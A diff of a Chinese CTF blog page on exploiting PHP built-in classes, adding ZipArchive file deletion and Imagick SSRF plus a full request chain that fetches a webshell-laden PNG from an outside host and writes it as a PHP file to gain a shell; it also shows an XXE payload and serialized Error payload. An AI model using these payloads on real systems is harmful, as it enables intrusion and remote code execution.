@@ -38,10 +38,15 @@
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831205640742.png">
 <meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831210437813.png">
 <meta property="og:image" content="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165126622-199442235.jpg">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20210329180251-ec84f21c-9075-1.png">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20210329180252-eccb96c2-9075-1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210412171433957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdn,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210413205238677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdn,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114105514955.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114105842562.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114110549377.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114110658075.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114110752080.png">
 <meta property="article:published_time" content="2021-08-31T07:01:33.000Z">
-<meta property="article:modified_time" content="2021-08-31T14:13:59.679Z">
+<meta property="article:modified_time" content="2022-11-14T03:08:44.092Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="PHP">
 <meta property="article:tag" content="CTF">
@@ -302,7 +307,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.8k</span>Reading time: <span class="post-count reading-time">8 min</span></span>
+                        <span>Word count: <span class="post-count word-count">2.5k</span>Reading time: <span class="post-count reading-time">12 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -504,7 +509,7 @@ height:50vh;
 
 <p><code>echo $file</code>也可以，在这里<code>__toString()</code>是<code>fgets()</code>的别名</p>
 <p> <img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831162541848.png" alt="image-20210831162541848"></p>
-<h2 id="finfo类"><a href="#finfo类" class="headerlink" title="finfo类"></a>finfo类</h2><p>finfo类用于返回一个资源的信息</p>
+<h3 id="finfo类"><a href="#finfo类" class="headerlink" title="finfo类"></a>finfo类</h3><p>finfo类用于返回一个资源的信息</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$finfo = finfo_open(FILEINFO_DEVICES);</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_EXTENSION);</span><br><span class="line"><span class="keyword">foreach</span>(glob(<span class="string">&quot;*&quot;</span>) <span class="keyword">as</span> $filename)&#123;</span><br><span class="line">        <span class="keyword">echo</span> finfo_file($finfo,$filename).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">finfo_close($finfo);</span><br></pre></td></tr></table></figure>
 
 <p>finfo_open用到的常量列表<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/fileinfo.constants.php">https://www.php.net/manual/zh/fileinfo.constants.php</a></p>
@@ -581,7 +586,7 @@ height:50vh;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br></pre></td></tr></table></figure>
 
 <p>exp</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&gt;&lt;?=phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Error</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>Dphpinfo%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>php+shell+code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&gt;&lt;?=phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Error</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>Dphpinfo%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>php+shell+code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831210437813.png" alt="image-20210831210437813"></p>
 <h2 id="绕过hash值校验"><a href="#绕过hash值校验" class="headerlink" title="绕过hash值校验"></a>绕过hash值校验</h2><p>index.php</p>
@@ -605,12 +610,45 @@ height:50vh;
 <p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165126622-199442235.jpg" alt="img"></p>
 <h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
 <p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
-<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210329180251-ec84f21c-9075-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210329180251-ec84f21c-9075-1.png" alt="img"></a></p>
-<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20210329180252-eccb96c2-9075-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210329180252-eccb96c2-9075-1.png" alt="img"></a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210412171433957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdn,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>可以看到通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
 <p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;evil.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true</span><br></pre></td></tr></table></figure>
+
+<h1 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h1><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理</p>
+<p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210413205238677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdn,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。</p>
+<p>例题：梦里花开牡丹亭</p>
+<h1 id="Imagick类"><a href="#Imagick类" class="headerlink" title="Imagick类"></a>Imagick类</h1><p>参考链接：<a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a></p>
+<p>php手册介绍：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/imagick.installation.php">https://www.php.net/manual/zh/imagick.installation.php</a></p>
+<p>Imagick是php中用于图像处理的拓展类，不是php自带的，<strong>需要手动安装</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-imagick</span><br><span class="line">php -m | grep imagick</span><br><span class="line">service apache2 restart</span><br><span class="line">或</span><br><span class="line">pecl.php.net&#x2F;package&#x2F;imagick&#x2F;download#下载压缩包</span><br><span class="line">tar -zxvf xxx.tagz</span><br><span class="line">cd imagick-2.2.3</span><br><span class="line">phpize</span><br><span class="line">.&#x2F;configure --with-imagick&#x3D;&#x2F;opt&#x2F;local</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>主要用于以下情景的利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">new</span> $a($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>缺少echo，仅仅new一个对象的情况</p>
+<h2 id="简单SSRF"><a href="#简单SSRF" class="headerlink" title="简单SSRF"></a>简单SSRF</h2><p>在Imagick的构造方法中，将files的路径作为参数传入，实际上如果file使用的是http协议，在构造方法调用时php会自动请求该资源</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114105514955.png" alt="image-20221114105514955"></p>
+<p>请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;object.php?a&#x3D;Imagick&amp;b&#x3D;http:&#x2F;&#x2F;172.17.0.1:8888&#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.119.164:8989</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在服务器上接收到请求</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114105842562.png" alt="image-20221114105842562"></p>
+<h2 id="出网RCE"><a href="#出网RCE" class="headerlink" title="出网RCE"></a>出网RCE</h2><p>生成图片马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#安装命令</span><br><span class="line">apt-get install graphicsmagick-imagemagick-compat</span><br><span class="line">convert xc:red -set &#39;Copyright&#39; &#39;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#39; positive.png</span><br></pre></td></tr></table></figure>
+
+<p>请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;object.php?a&#x3D;Imagick&amp;b&#x3D;vid:msl:&#x2F;tmp&#x2F;php* HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.119.164:8989</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryeBymiZfQE9hubMlU</span><br><span class="line">Content-Length: 322</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeBymiZfQE9hubMlU</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;exec[]&quot;; filename&#x3D;&quot;exec.msl&quot;</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename&#x3D;&quot;http:&#x2F;&#x2F;172.17.0.1:8888&#x2F;positive.png&quot; &#x2F;&gt;</span><br><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;positive2.php&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;image&gt;</span><br><span class="line">------WebKitFormBoundaryeBymiZfQE9hubMlU--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>vps上捕获到请求</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114110549377.png" alt="image-20221114110549377"></p>
+<p>此时查看tmp目录和write的目录，都存在文件</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114110658075.png" alt="image-20221114110658075"></p>
+<p>访问positive2.php成功getshell</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20221114110752080.png" alt="image-20221114110752080"></p>
 
     </article>
     <!-- license  -->
@@ -619,7 +657,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2021/08/31/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://hackerqwq.github.io/2021/08/31/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2021/08/31/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">August 31st 2021, 3:01:33 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2021/08/31/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">August 31st 2021, 10:13:59 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2021/08/31/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">November 14th 2022, 11:08:44 am</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -764,7 +802,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SPL"><span class="toc-number">1.</span> <span class="toc-text">SPL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%9A%84%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">遍历目录的类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FilesystemIterator"><span class="toc-number">1.1.1.</span> <span class="toc-text">FilesystemIterator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirectoryIterator"><span class="toc-number">1.1.2.</span> <span class="toc-text">DirectoryIterator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GlobIterator"><span class="toc-number">1.1.3.</span> <span class="toc-text">GlobIterator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E7%9A%84%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">操作文件的类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SplFileObejct"><span class="toc-number">1.2.1.</span> <span class="toc-text">SplFileObejct</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">finfo类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Error-amp-Exception"><span class="toc-number">2.</span> <span class="toc-text">Error&amp;Exception</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error"><span class="toc-number">2.1.</span> <span class="toc-text">Error</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception"><span class="toc-number">2.2.</span> <span class="toc-text">Exception</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">2.3.1.</span> <span class="toc-text">XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87hash%E5%80%BC%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.5.</span> <span class="toc-text">绕过hash值校验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SoapClient"><span class="toc-number">3.</span> <span class="toc-text">SoapClient</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">3.0.1.</span> <span class="toc-text">SSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SimpleXMLElement"><span class="toc-number">4.</span> <span class="toc-text">SimpleXMLElement</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SPL"><span class="toc-number">1.</span> <span class="toc-text">SPL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%9A%84%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">遍历目录的类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FilesystemIterator"><span class="toc-number">1.1.1.</span> <span class="toc-text">FilesystemIterator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirectoryIterator"><span class="toc-number">1.1.2.</span> <span class="toc-text">DirectoryIterator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GlobIterator"><span class="toc-number">1.1.3.</span> <span class="toc-text">GlobIterator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E7%9A%84%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">操作文件的类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SplFileObejct"><span class="toc-number">1.2.1.</span> <span class="toc-text">SplFileObejct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#finfo%E7%B1%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">finfo类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Error-amp-Exception"><span class="toc-number">2.</span> <span class="toc-text">Error&amp;Exception</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error"><span class="toc-number">2.1.</span> <span class="toc-text">Error</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception"><span class="toc-number">2.2.</span> <span class="toc-text">Exception</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">2.3.1.</span> <span class="toc-text">XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87hash%E5%80%BC%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.5.</span> <span class="toc-text">绕过hash值校验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SoapClient"><span class="toc-number">3.</span> <span class="toc-text">SoapClient</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">3.0.1.</span> <span class="toc-text">SSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SimpleXMLElement"><span class="toc-number">4.</span> <span class="toc-text">SimpleXMLElement</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZipArchive-%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">ZipArchive 类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Imagick%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">Imagick类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95SSRF"><span class="toc-number">6.1.</span> <span class="toc-text">简单SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%BD%91RCE"><span class="toc-number">6.2.</span> <span class="toc-text">出网RCE</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3420,9 +3458,161 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
